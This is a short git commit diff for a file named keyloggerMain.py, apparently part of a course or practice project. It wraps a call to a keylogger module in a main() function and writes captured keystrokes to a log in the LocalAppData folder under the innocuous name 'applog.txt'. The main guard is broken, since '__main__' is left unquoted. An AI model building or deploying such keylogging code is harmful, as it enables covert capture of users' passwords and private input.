0bd76356e1ac5cac1d34e087248490752acbd417
Erik Ellis <elliserik69@gmail.com>
2019-11-21 10:53:44 -0500

    Edit to main

--- Keyloggers/keyloggerMain.py
+++ Keyloggers/keyloggerMain.py
@@ -1,8 +1,11 @@
 import os
 from SRA211.Keyloggers import keylogger
 
+def main():
+    log_dir = os.environ['localappdata']
+    log_name = 'applog.txt'
 
-log_dir = os.environ['localappdata']
-log_name = 'applog.txt'
+    keylogger.getKeystrokes(log_dir, log_name)
 
-keylogger.getKeystrokes(log_dir, log_name)
+if __name__==__main__:
+        main()
